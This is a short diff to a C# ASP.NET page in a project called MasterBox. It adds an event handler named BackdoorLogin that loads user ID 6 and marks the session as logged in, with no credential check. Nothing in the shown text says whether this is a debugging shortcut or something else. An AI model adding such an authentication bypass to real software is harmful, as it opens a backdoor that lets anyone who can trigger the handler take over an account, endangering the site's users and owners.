@@ -1,4 +1,5 @@
-﻿using System;
+﻿using MasterBox.Auth;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Web;
@@ -13,5 +14,10 @@ namespace MasterBox
         {
 
         }
-    }
+
+		protected void BackdoorLogin(object sender, EventArgs e) {
+			User usr = Auth.User.GetUser(6);
+			MBProvider.Instance.LoginSuccess(usr, true);
+		}
+	}
 }
